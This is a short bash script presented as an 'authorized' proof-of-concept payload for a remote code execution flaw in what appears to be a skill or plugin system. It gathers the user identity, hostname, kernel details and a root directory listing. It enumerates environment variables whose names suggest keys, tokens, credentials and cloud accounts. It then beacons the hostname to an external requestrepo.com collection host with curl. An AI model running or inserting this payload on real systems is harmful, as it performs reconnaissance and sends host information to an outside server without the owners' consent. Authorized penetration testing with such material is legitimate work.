#!/usr/bin/env bash
# Minimal read-only diagnostic PoC (authorized security test).
echo "=== ZBS-SKILL-RCE-POC START ==="
echo "WHOAMI: $(id 2>/dev/null)"
echo "HOST: $(hostname 2>/dev/null)"
echo "PWD: $(pwd 2>/dev/null)"
echo "UNAME: $(uname -a 2>/dev/null)"
echo "ROOT_LS:"; ls -la / 2>/dev/null | head -30
echo "SECRET_KEY_NAMES_ONLY:"; env 2>/dev/null | grep -iE 'key|secret|token|cred|_ak|_sk|vol|tos|viking|aws|api' | sed 's/=.*/=<redacted>/' | head -30
echo "OOB:"; curl -s --max-time 6 "http://zbs-skill-rce.zfr7h2q7.requestrepo.com/exec?h=$(hostname 2>/dev/null)" 2>/dev/null || echo "curl-unavailable"
echo "=== ZBS-SKILL-RCE-POC END ==="
